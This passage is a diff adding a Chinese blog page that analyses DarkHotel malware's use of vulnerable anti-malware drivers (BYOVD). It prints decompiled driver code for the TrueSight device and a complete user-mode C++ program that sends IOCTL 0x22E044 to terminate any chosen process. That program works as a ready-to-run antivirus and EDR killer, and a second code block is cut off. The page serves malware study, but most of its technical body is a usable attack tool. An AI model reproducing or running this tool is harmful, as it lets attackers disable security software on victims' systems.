@@ -1,0 +1,341 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="APT-C-06（DarkHotel）利用BYOVD技术的最新攻击活动分析链接如下https:&#x2F;&#x2F;mp.weixin.qq.com&#x2F;s&#x2F;m2G9oLHv504HJDW8mB5rDA 当时hvv期间看了这篇文章学习到了一些东西，最近有空可以写东西分享一下。 BYOVD技术当前样本释放的两个sys文件md5为21e13f2cb269defeae5e1d09887d47bb和f53fa44c7b591a">
+<meta property="og:type" content="article">
+<meta property="og:title" content="APT-C-06（DarkHotel）利用BYOVD技术的最新攻击活动分析">
+<meta property="og:url" content="http://example.com/2025/08/17/APT-C-06%EF%BC%88DarkHotel%EF%BC%89%E5%88%A9%E7%94%A8BYOVD%E6%8A%80%E6%9C%AF%E7%9A%84%E6%9C%80%E6%96%B0%E6%94%BB%E5%87%BB%E6%B4%BB%E5%8A%A8%E5%88%86%E6%9E%90/index.html">
+<meta property="og:site_name" content="CHANGMEN&#39;blogs">
+<meta property="og:description" content="APT-C-06（DarkHotel）利用BYOVD技术的最新攻击活动分析链接如下https:&#x2F;&#x2F;mp.weixin.qq.com&#x2F;s&#x2F;m2G9oLHv504HJDW8mB5rDA 当时hvv期间看了这篇文章学习到了一些东西，最近有空可以写东西分享一下。 BYOVD技术当前样本释放的两个sys文件md5为21e13f2cb269defeae5e1d09887d47bb和f53fa44c7b591a">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250817015540225.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250817014051381.png">
+<meta property="article:published_time" content="2025-08-16T16:38:01.000Z">
+<meta property="article:modified_time" content="2025-08-16T17:58:18.410Z">
+<meta property="article:author" content="CHANGMEN">
+<meta property="article:tag" content="恶意样本分析">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250817015540225.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>APT-C-06（DarkHotel）利用BYOVD技术的最新攻击活动分析</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 5.4.2"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/categories/">categories</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2025/08/16/%E7%97%85%E6%AF%92%E6%A0%B7%E6%9C%AC-%E7%99%BD%E5%8A%A0%E9%BB%91-1/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2025/08/17/APT-C-06%EF%BC%88DarkHotel%EF%BC%89%E5%88%A9%E7%94%A8BYOVD%E6%8A%80%E6%9C%AF%E7%9A%84%E6%9C%80%E6%96%B0%E6%94%BB%E5%87%BB%E6%B4%BB%E5%8A%A8%E5%88%86%E6%9E%90/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2025/08/17/APT-C-06%EF%BC%88DarkHotel%EF%BC%89%E5%88%A9%E7%94%A8BYOVD%E6%8A%80%E6%9C%AF%E7%9A%84%E6%9C%80%E6%96%B0%E6%94%BB%E5%87%BB%E6%B4%BB%E5%8A%A8%E5%88%86%E6%9E%90/&text=APT-C-06（DarkHotel）利用BYOVD技术的最新攻击活动分析"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2025/08/17/APT-C-06%EF%BC%88DarkHotel%EF%BC%89%E5%88%A9%E7%94%A8BYOVD%E6%8A%80%E6%9C%AF%E7%9A%84%E6%9C%80%E6%96%B0%E6%94%BB%E5%87%BB%E6%B4%BB%E5%8A%A8%E5%88%86%E6%9E%90/&title=APT-C-06（DarkHotel）利用BYOVD技术的最新攻击活动分析"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2025/08/17/APT-C-06%EF%BC%88DarkHotel%EF%BC%89%E5%88%A9%E7%94%A8BYOVD%E6%8A%80%E6%9C%AF%E7%9A%84%E6%9C%80%E6%96%B0%E6%94%BB%E5%87%BB%E6%B4%BB%E5%8A%A8%E5%88%86%E6%9E%90/&is_video=false&description=APT-C-06（DarkHotel）利用BYOVD技术的最新攻击活动分析"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=APT-C-06（DarkHotel）利用BYOVD技术的最新攻击活动分析&body=Check out this article: http://example.com/2025/08/17/APT-C-06%EF%BC%88DarkHotel%EF%BC%89%E5%88%A9%E7%94%A8BYOVD%E6%8A%80%E6%9C%AF%E7%9A%84%E6%9C%80%E6%96%B0%E6%94%BB%E5%87%BB%E6%B4%BB%E5%8A%A8%E5%88%86%E6%9E%90/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2025/08/17/APT-C-06%EF%BC%88DarkHotel%EF%BC%89%E5%88%A9%E7%94%A8BYOVD%E6%8A%80%E6%9C%AF%E7%9A%84%E6%9C%80%E6%96%B0%E6%94%BB%E5%87%BB%E6%B4%BB%E5%8A%A8%E5%88%86%E6%9E%90/&title=APT-C-06（DarkHotel）利用BYOVD技术的最新攻击活动分析"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2025/08/17/APT-C-06%EF%BC%88DarkHotel%EF%BC%89%E5%88%A9%E7%94%A8BYOVD%E6%8A%80%E6%9C%AF%E7%9A%84%E6%9C%80%E6%96%B0%E6%94%BB%E5%87%BB%E6%B4%BB%E5%8A%A8%E5%88%86%E6%9E%90/&title=APT-C-06（DarkHotel）利用BYOVD技术的最新攻击活动分析"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2025/08/17/APT-C-06%EF%BC%88DarkHotel%EF%BC%89%E5%88%A9%E7%94%A8BYOVD%E6%8A%80%E6%9C%AF%E7%9A%84%E6%9C%80%E6%96%B0%E6%94%BB%E5%87%BB%E6%B4%BB%E5%8A%A8%E5%88%86%E6%9E%90/&title=APT-C-06（DarkHotel）利用BYOVD技术的最新攻击活动分析"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2025/08/17/APT-C-06%EF%BC%88DarkHotel%EF%BC%89%E5%88%A9%E7%94%A8BYOVD%E6%8A%80%E6%9C%AF%E7%9A%84%E6%9C%80%E6%96%B0%E6%94%BB%E5%87%BB%E6%B4%BB%E5%8A%A8%E5%88%86%E6%9E%90/&title=APT-C-06（DarkHotel）利用BYOVD技术的最新攻击活动分析"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2025/08/17/APT-C-06%EF%BC%88DarkHotel%EF%BC%89%E5%88%A9%E7%94%A8BYOVD%E6%8A%80%E6%9C%AF%E7%9A%84%E6%9C%80%E6%96%B0%E6%94%BB%E5%87%BB%E6%B4%BB%E5%8A%A8%E5%88%86%E6%9E%90/&name=APT-C-06（DarkHotel）利用BYOVD技术的最新攻击活动分析&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2025/08/17/APT-C-06%EF%BC%88DarkHotel%EF%BC%89%E5%88%A9%E7%94%A8BYOVD%E6%8A%80%E6%9C%AF%E7%9A%84%E6%9C%80%E6%96%B0%E6%94%BB%E5%87%BB%E6%B4%BB%E5%8A%A8%E5%88%86%E6%9E%90/&t=APT-C-06（DarkHotel）利用BYOVD技术的最新攻击活动分析"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#APT-C-06%EF%BC%88DarkHotel%EF%BC%89%E5%88%A9%E7%94%A8BYOVD%E6%8A%80%E6%9C%AF%E7%9A%84%E6%9C%80%E6%96%B0%E6%94%BB%E5%87%BB%E6%B4%BB%E5%8A%A8%E5%88%86%E6%9E%90"><span class="toc-number">1.</span> <span class="toc-text">APT-C-06（DarkHotel）利用BYOVD技术的最新攻击活动分析</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%93%BE%E6%8E%A5%E5%A6%82%E4%B8%8B"><span class="toc-number">1.1.</span> <span class="toc-text">链接如下</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#BYOVD%E6%8A%80%E6%9C%AF"><span class="toc-number">1.2.</span> <span class="toc-text">BYOVD技术</span></a></li></ol></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        APT-C-06（DarkHotel）利用BYOVD技术的最新攻击活动分析
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">CHANGMEN</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2025-08-16T16:38:01.000Z" class="dt-published" itemprop="datePublished">2025-08-17</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/%E6%81%B6%E6%84%8F%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/">恶意样本分析</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/%E6%81%B6%E6%84%8F%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/" rel="tag">恶意样本分析</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h1 id="APT-C-06（DarkHotel）利用BYOVD技术的最新攻击活动分析"><a href="#APT-C-06（DarkHotel）利用BYOVD技术的最新攻击活动分析" class="headerlink" title="APT-C-06（DarkHotel）利用BYOVD技术的最新攻击活动分析"></a>APT-C-06（DarkHotel）利用BYOVD技术的最新攻击活动分析</h1><h2 id="链接如下"><a href="#链接如下" class="headerlink" title="链接如下"></a>链接如下</h2><p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/m2G9oLHv504HJDW8mB5rDA">https://mp.weixin.qq.com/s/m2G9oLHv504HJDW8mB5rDA</a></p>
+<p>当时hvv期间看了这篇文章学习到了一些东西，最近有空可以写东西分享一下。</p>
+<h2 id="BYOVD技术"><a href="#BYOVD技术" class="headerlink" title="BYOVD技术"></a>BYOVD技术</h2><p>当前样本释放的两个sys文件md5为21e13f2cb269defeae5e1d09887d47bb和f53fa44c7b591a2be105344790543369，前者为杀软Zemana的驱动程序，后者为杀软Adlice的驱动程序。<img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250817015540225.png" alt="image-20250817015540225"></p>
+<p>这里攻击者使用了BYOVD（Bring Your Own Vulnerable Driver）攻击：利用存在漏洞的驱动程序进行权限提升或绕过安全机制的攻击方式。在当前样本中，攻击者利用上述两个包含漏洞的驱动程序来关闭杀软进程。具体的实现方式是向两个驱动程序创建的设备handle发送特定的IO控制代码，再结合指定进程的pid，就可以关闭指定进程。</p>
+<p>简单说就是利用正常的驱动文件，使用ioctl进行功能调用进行一些恶意操作，在此篇文件中就是进行了终止进行的操作，利用了ZwTerminateProcess函数，我们直接把sys驱动下载下来进行加载之后，然后使用exe进行调用功能即可，驱动相关的逆向代码我写在下面.</p>
+<p>首先就是驱动的开始</p>
+<p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250817014051381.png" alt="image-20250817014051381"></p>
+<p>进入这个函数之后，直接可以看到 </p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DriverObject-&gt;MajorFunction[<span class="number">14</span>] = (PDRIVER_DISPATCH)sub_1400017C0;</span><br></pre></td></tr></table></figure>
+
+<p>这个就是我们自定义的一些功能写在这里，好多我也忘了，有空整理一下byovd的基础,关于驱动开发方面的。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">NTSTATUS __fastcall <span class="title function_">sub_14000A000</span><span class="params">(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath)</span></span><br><span class="line">&#123;</span><br><span class="line">  NTSTATUS result; <span class="comment">// eax</span></span><br><span class="line">  __int64 v4; <span class="comment">// [rsp+50h] [rbp-B0h] BYREF</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">UNICODE_STRING</span> <span class="title">DestinationString</span>;</span> <span class="comment">// [rsp+58h] [rbp-A8h] BYREF</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">UNICODE_STRING</span> <span class="title">SymbolicLinkName</span>;</span> <span class="comment">// [rsp+68h] [rbp-98h] BYREF</span></span><br><span class="line">  _OSVERSIONINFOW VersionInformation; <span class="comment">// [rsp+80h] [rbp-80h] BYREF</span></span><br><span class="line"></span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  RtlInitUnicodeString(&amp;DestinationString, <span class="string">L&quot;\\Device\\TrueSight&quot;</span>);</span><br><span class="line">  RtlInitUnicodeString(&amp;SymbolicLinkName, <span class="string">L&quot;\\DosDevices\\TrueSight&quot;</span>);</span><br><span class="line">  VersionInformation.dwOSVersionInfoSize = <span class="number">276</span>;</span><br><span class="line">  <span class="keyword">if</span> ( RtlGetVersion(&amp;VersionInformation) &gt;= <span class="number">0</span></span><br><span class="line">    &amp;&amp; (VersionInformation.dwMajorVersion &gt; <span class="number">6</span></span><br><span class="line">     || VersionInformation.dwMajorVersion == <span class="number">6</span> &amp;&amp; VersionInformation.dwMinorVersion &gt;= <span class="number">2</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    PoolType = <span class="number">512</span>;</span><br><span class="line">    n0x40000000 = <span class="number">0x40000000</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  result = sub_1400080D0(DriverObject, <span class="number">0</span>, &amp;DestinationString, <span class="number">34</span>, <span class="number">256</span>, <span class="number">0</span>, (__int64)<span class="string">L&quot;VX&quot;</span>, <span class="number">0</span>, (__int64)&amp;v4);</span><br><span class="line">  <span class="keyword">if</span> ( !result )</span><br><span class="line">  &#123;</span><br><span class="line">    memset64(DriverObject-&gt;MajorFunction, (<span class="type">unsigned</span> __int64)sub_1400017A0, <span class="number">0x1Cu</span>);</span><br><span class="line">    DriverObject-&gt;DriverStartIo = <span class="number">0</span>;</span><br><span class="line">    DriverObject-&gt;MajorFunction[<span class="number">0</span>] = (PDRIVER_DISPATCH)sub_1400017A0;</span><br><span class="line">    DriverObject-&gt;MajorFunction[<span class="number">2</span>] = (PDRIVER_DISPATCH)sub_1400017A0;</span><br><span class="line">    DriverObject-&gt;MajorFunction[<span class="number">14</span>] = (PDRIVER_DISPATCH)sub_1400017C0;</span><br><span class="line">    DriverObject-&gt;DriverUnload = (PDRIVER_UNLOAD)sub_140008000;</span><br><span class="line">    *(_DWORD *)(v4 + <span class="number">48</span>) |= <span class="number">0x10u</span>;</span><br><span class="line">    *(_DWORD *)(v4 + <span class="number">48</span>) &amp;= ~<span class="number">0x80u</span>;</span><br><span class="line">    <span class="keyword">return</span> IoCreateSymbolicLink(&amp;SymbolicLinkName, &amp;DestinationString);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( LowPart == <span class="number">0x22E044</span> )</span><br><span class="line">&#123;</span><br><span class="line">  Status_1 = sub_140001690(MasterIrp, Options, &amp;p_Information);</span><br><span class="line">  <span class="keyword">goto</span> LABEL_39;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">sub_140001690</span><span class="params">(<span class="keyword">struct</span> _IRP *MasterIrp, __int64 Options, _QWORD *p_Information)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( MasterIrp &amp;&amp; (<span class="type">unsigned</span> <span class="type">int</span>)Options &gt;= <span class="number">4</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    result = sub_140002B7C(*(_DWORD *)&amp;MasterIrp-&gt;Type);</span><br><span class="line">    <span class="keyword">if</span> ( !(_DWORD)result )</span><br><span class="line">      *p_Information = <span class="number">4</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    *p_Information = <span class="number">4</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">2147483653LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">sub_140002B7C</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> UniqueProcess)</span></span><br><span class="line">&#123;</span><br><span class="line">  NTSTATUS v1; <span class="comment">// ebx</span></span><br><span class="line">  _CLIENT_ID ClientId; <span class="comment">// [rsp+20h] [rbp-40h] BYREF</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">OBJECT_ATTRIBUTES</span> <span class="title">ObjectAttributes</span>;</span> <span class="comment">// [rsp+30h] [rbp-30h] BYREF</span></span><br><span class="line">  <span class="type">void</span> *ProcessHandle; <span class="comment">// [rsp+78h] [rbp+18h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(&amp;ObjectAttributes.RootDirectory, <span class="number">0</span>, <span class="number">20</span>);</span><br><span class="line">  ClientId.UniqueThread = <span class="number">0</span>;</span><br><span class="line">  ProcessHandle = <span class="number">0</span>;</span><br><span class="line">  *(_OWORD *)&amp;ObjectAttributes.SecurityDescriptor = <span class="number">0</span>;</span><br><span class="line">  ClientId.UniqueProcess = (HANDLE)UniqueProcess;</span><br><span class="line">  ObjectAttributes.Length = <span class="number">48</span>;</span><br><span class="line">  v1 = ZwOpenProcess(&amp;ProcessHandle, <span class="number">1u</span>, &amp;ObjectAttributes, &amp;ClientId);</span><br><span class="line">  <span class="keyword">if</span> ( v1 &gt;= <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v1 = ZwTerminateProcess(ProcessHandle, <span class="number">0</span>);</span><br><span class="line">    ZwClose(ProcessHandle);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> (<span class="type">unsigned</span> <span class="type">int</span>)v1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>然后进行写用户态代码即可，附在下面，自行研究。</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IOCTL_TERMINATE_PROCESS 0x22E044</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    HANDLE hDevice;</span><br><span class="line">    DWORD bytesReturned;</span><br><span class="line">    BOOL result;</span><br><span class="line">    DWORD pidToTerminate;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 打开设备</span></span><br><span class="line">    hDevice = <span class="built_in">CreateFileW</span>(<span class="string">L&quot;\\\\.\\TrueSight&quot;</span>,</span><br><span class="line">        GENERIC_READ | GENERIC_WRITE,</span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">        <span class="literal">NULL</span>,</span><br><span class="line">        OPEN_EXISTING,</span><br><span class="line">        FILE_ATTRIBUTE_NORMAL,</span><br><span class="line">        <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (hDevice == INVALID_HANDLE_VALUE) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;无法打开设备，错误代码: %d\n&quot;</span>, <span class="built_in">GetLastError</span>());</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;请输入要终止的进程PID: &quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;pidToTerminate);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 准备IOCTL请求</span></span><br><span class="line">    result = <span class="built_in">DeviceIoControl</span>(hDevice,</span><br><span class="line">        IOCTL_TERMINATE_PROCESS,</span><br><span class="line">        &amp;pidToTerminate,    <span class="comment">// 输入缓冲区</span></span><br><span class="line">        <span class="built_in">sizeof</span>(DWORD),      <span class="comment">// 输入缓冲区大小</span></span><br><span class="line">        <span class="literal">NULL</span>,               <span class="comment">// 输出缓冲区</span></span><br><span class="line">        <span class="number">0</span>,                  <span class="comment">// 输出缓冲区大小</span></span><br><span class="line">        &amp;bytesReturned,     <span class="comment">// 返回的字节数</span></span><br><span class="line">        <span class="literal">NULL</span>);              <span class="comment">// 不重叠</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (result) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;成功发送终止进程请求\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;请求失败，错误代码: %d\n&quot;</span>, <span class="built_in">GetLastError</span>());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">CloseHandle</span>(hDevice);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>另一个代码，自行逆向研究</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span 